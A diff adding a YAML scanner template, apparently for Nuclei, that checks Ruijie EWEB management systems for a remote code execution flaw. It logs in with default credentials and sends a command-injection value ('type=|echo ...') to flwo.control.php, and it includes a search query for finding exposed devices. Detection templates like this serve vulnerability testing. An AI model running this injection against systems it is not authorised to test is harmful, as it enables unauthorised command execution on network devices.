@@ -1,0 +1,60 @@
+id: poc-yaml-ruijie-flwo-control-php-rce
+info:
+  name: Ruijie Network Flow Control PHP RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    description: |
+      Ruijie EWEB Network Management System flwo.control.php is vulnerable to Remote Code Execution (RCE).
+    fofa-query: title="锐捷网络-EWEB网管系统"
+
+variables:
+  t1: "{{rand_int(10000, 99999)}}"
+  t2: "{{rand_int(1000, 10000)}}"
+  t3: "{{to_number(t1) + to_number(t2)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: login-request
+    method: POST
+    path:
+      - "{{BaseURL}}/ddi/server/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        regex:
+          - "RUIJIEID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: rce-verification
+    method: POST
+    path:
+      - "{{BaseURL}}/flow_control_pi/flwo.control.php?a=getFlowGroup"
+    headers:
+      Cookie: RUIJIEID={{cookie}};user=admin
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      type=|echo "This website has a vulnerability`expr {{t1}} %2B {{t2}}`";
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
